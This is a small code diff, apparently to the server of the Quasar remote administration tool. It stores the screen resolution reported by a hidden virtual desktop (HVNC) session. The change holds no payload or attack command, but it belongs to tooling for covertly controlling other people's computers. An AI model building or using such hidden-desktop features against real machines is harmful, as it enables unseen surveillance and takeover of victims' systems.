@@ -109,6 +109,8 @@ namespace Quasar.Server.Messages
         private int _framesReceived = 0;
         private double _estimatedFps = 0;
 
+        public static Size resolution = new Size(0, 0);
+
         /// <summary>
         /// Initializes a new instance of the <see cref="RemoteDesktopHandler"/> class using the given client.
         /// </summary>
@@ -139,6 +141,8 @@ namespace Quasar.Server.Messages
         private async void Execute(ISender client, GetHVNCDesktopResponse message)
         {
             _framesReceived++;
+
+            resolution = new Size { Height = message.Resolution.Height, Width = message.Resolution.Width };
 
             if (_performanceMonitor.ElapsedMilliseconds >= 1000)
             {
